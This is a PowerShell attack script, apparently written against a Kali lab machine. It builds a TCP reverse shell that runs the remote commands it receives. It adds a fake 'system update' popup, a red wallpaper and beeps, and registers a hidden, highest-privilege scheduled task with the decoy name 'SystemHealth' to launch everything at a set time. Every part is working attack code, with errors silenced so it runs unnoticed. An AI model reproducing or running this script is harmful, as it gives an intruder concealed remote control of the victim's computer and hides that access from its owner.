# Set attacker IP and port
$KaliIP = "192.168.56.104"
$KaliPort = 4444

# Build full PowerShell reverse shell as single-line string
$revShell = "[System.Net.Sockets.TCPClient]`$client = New-Object System.Net.Sockets.TCPClient('$KaliIP',$KaliPort); `$stream = `$client.GetStream(); [byte[]]`$bytes = 0..65535|%{0}; while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){ `$data = (New-Object -TypeName Text.ASCIIEncoding).GetString(`$bytes,0,`$i); `$sendback = (iex `$data 2>&1 | Out-String); `$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> '; `$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2); `$stream.Write(`$sendbyte,0,`$sendbyte.Length); `$stream.Flush(); } `$client.Close();"

# Build full visual payload (popup + wallpaper + beeps)
$visuals = @"
cmd /c `"msg * /TIME:30 YOUR SYSTEM IS BEING UPDATED!`"
"@

Add-Type -TypeDefinition @"
using System;
using System.Drawing;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

    public static void SetWallpaper() {
        using(Bitmap bmp = new Bitmap(1,1)) {
            bmp.SetPixel(0,0,Color.Red);
            string path = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "redwall.bmp");
            bmp.Save(path);
            SystemParametersInfo(20, 0, path, 0x01 | 0x02);
        }
    }
}
"@ -ErrorAction SilentlyContinue

[Wallpaper]::SetWallpaper()

# Play beeps
1..3 | ForEach-Object {
    [console]::Beep(800, 300)
    Start-Sleep -Milliseconds 200
}

# Combine visual and shell payloads
$payload = "$visuals; $revShell"

# Schedule it to run at 10:13 PM on 06/11/2025
try {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command `$ErrorActionPreference='SilentlyContinue'; $payload"
    $trigger = New-ScheduledTaskTrigger -Once -At ([datetime]"06/11/2025 22:13")
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName "SystemHealth" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force -ErrorAction SilentlyContinue | Out-Null
} catch {}

# Optional: Manual trigger
# schtasks /run /tn "SystemHealth"
